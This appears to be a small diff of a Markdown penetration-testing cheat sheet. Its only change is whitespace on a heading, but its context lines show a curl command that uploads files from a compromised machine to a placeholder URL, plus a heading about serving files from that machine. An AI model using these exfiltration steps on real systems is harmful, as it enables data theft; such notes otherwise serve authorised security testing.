@@ -74,7 +74,7 @@ curl -X POST <URL> -F 'files=@<path_to_file>' -F 'files=@<path_to_file>' --insec
 # Note multiple files in the same command. --insecure flag needed for self-signed cert
 ```
 
-**Copy Files to a directory and start a web server on the compromised machine**
+**Copy Files to a directory and start a web server on the compromised machine**  
 Starting webservers in various languages
 ```bash
 # python3
